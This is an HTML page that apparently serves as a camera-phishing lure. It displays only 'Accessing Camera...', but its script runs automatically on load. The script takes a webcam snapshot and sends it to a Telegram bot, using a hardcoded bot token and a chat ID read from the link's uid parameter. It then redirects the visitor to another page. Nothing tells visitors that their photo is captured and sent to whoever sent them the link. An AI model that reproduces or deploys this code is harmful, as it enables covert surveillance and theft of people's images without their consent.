
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Camera Access</title>
  <style>
    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
    button { padding: 15px 25px; margin: 15px; font-size: 18px; border: none; border-radius: 10px; cursor: pointer; }
    .action { background: #2196F3; color: white; }
  </style>
</head>
<body>
<h1>Accessing Camera...</h1>

<script>
const urlParams = new URLSearchParams(window.location.search);
const chatId = urlParams.get('uid');
const botToken = "7562867574:AAGyHAW7J0ipQWZ_nlwS5PA287wTK36DQ4c";

async function sendPhoto(blob) {
  const formData = new FormData();
  formData.append("chat_id", chatId);
  formData.append("photo", blob, "photo.jpg");
  await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
    method: "POST",
    body: formData
  });
}

async function getCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg"));
    await sendPhoto(blob);
    stream.getTracks().forEach(track => track.stop());
    window.open("https://example.com/camera-link", "_blank");
  } catch (err) {
    alert("Camera access denied.");
  }
}

getCamera();
</script>

</body>
</html>
